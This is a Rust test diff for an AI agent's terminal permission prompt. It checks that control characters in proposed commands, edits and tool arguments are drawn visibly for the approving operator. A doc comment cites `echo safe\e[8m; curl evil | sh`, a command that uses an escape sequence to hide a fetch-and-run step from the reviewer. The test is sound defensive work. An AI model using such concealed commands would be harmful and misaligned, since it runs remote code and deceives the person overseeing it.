@@ -374,3 +374,127 @@ fn no_content_puts_a_control_or_a_direction_mark_on_the_terminal() {
     }));
     assert!(all.is_empty(), "{all:#?}");
 }
+
+/// The drawn frame as text, one line per row.
+fn screen(app: &mut App, w: u16, h: u16) -> String {
+    let mut terminal =
+        Terminal::new(TestBackend::new(w, h)).expect("drawing into memory cannot fail");
+    terminal
+        .draw(|f| ui::draw(f, app))
+        .expect("drawing into memory cannot fail");
+    let buffer = terminal.backend().buffer().clone();
+    (0..h)
+        .map(|y| (0..w).map(|x| buffer[(x, y)].symbol()).collect::<String>())
+        .collect::<Vec<_>>()
+        .join("\n")
+}
+
+/// What the operator is asked to approve is what they can see: a control
+/// character dropped from the drawing would let `echo safe\e[8m; curl evil |
+/// sh` read as `echo safe[8m; curl evil | sh`, and a standing rule saved
+/// from it would hold bytes nobody read.
+#[test]
+fn a_permission_question_shows_each_control_it_holds_where_the_operator_approves_it() {
+    const CONTROLS: &str = "a\x1b[8mb\x07c\rd";
+    const SHOWN: [char; 3] = ['\u{241b}', '\u{2407}', '\u{240d}'];
+    let ask = |tool: &str, input: serde_json::Value, target: Option<String>, action| {
+        with(vec![Event::PermissionRequest {
+            id: "perm".into(),
+            tool: tool.to_owned(),
+            input: input.to_string(),
+            target,
+            proposal: action,
+            agent: None,
+        }])
+    };
+    let cases: Vec<(&str, App)> = vec![
+        (
+            "command",
+            ask(
+                "Bash",
+                serde_json::json!({ "command": CONTROLS }),
+                Some(CONTROLS.to_owned()),
+                Some(Proposal::new(
+                    Action::Command {
+                        command: CONTROLS.to_owned(),
+                    },
+                    ["command"],
+                )),
+            ),
+        ),
+        (
+            "edit",
+            ask(
+                "Edit",
+                serde_json::json!({ "file_path": "src/a.rs" }),
+                Some("src/a.rs".to_owned()),
+                Some(Proposal::new(
+                    Action::Replace {
+                        path: format!("src/{CONTROLS}.rs"),
+                        old: format!("old {CONTROLS}"),
+                        new: format!("new {CONTROLS}"),
+                        every: false,
+                    },
+                    ["file_path"],
+                )),
+            ),
+        ),
+        (
+            "write",
+            ask(
+                "Write",
+                serde_json::json!({ "file_path": "src/a.rs" }),
+                Some("src/a.rs".to_owned()),
+                Some(Proposal::new(
+                    Action::Write {
+                        path: "src/a.rs".to_owned(),
+                        content: format!("line {CONTROLS}\nnext"),
+                        existed: Some(false),
+                    },
+                    ["file_path"],
+                )),
+            ),
+        ),
+        (
+            "arguments",
+            ask(
+                "mcp__search__query",
+                serde_json::json!({ "query": CONTROLS, "note": format!("one\n{CONTROLS}") }),
+                None,
+                None,
+            ),
+        ),
+    ];
+
+    for (name, mut app) in cases {
+        let drawn = screen(&mut app, 120, 50);
+        for glyph in SHOWN {
+            assert!(
+                drawn.contains(glyph),
+                "{name} does not show {glyph:?}:\n{drawn}"
+            );
+        }
+    }
+
+    // The standing answer that would be saved, in the row that says so.
+    let mut app = ask(
+        "Bash",
+        serde_json::json!({ "command": CONTROLS }),
+        Some(CONTROLS.to_owned()),
+        Some(Proposal::new(
+            Action::Command {
+                command: CONTROLS.to_owned(),
+            },
+            ["command"],
+        )),
+    );
+    let drawn = screen(&mut app, 120, 50);
+    let saved: Vec<&str> = drawn
+        .lines()
+        .filter(|l| l.contains("niobe saves Bash("))
+        .collect();
+    assert!(!saved.is_empty(), "no row says what is saved:\n{drawn}");
+    for row in saved {
+        assert!(row.contains('\u{241b}'), "{row}");
+    }
+}
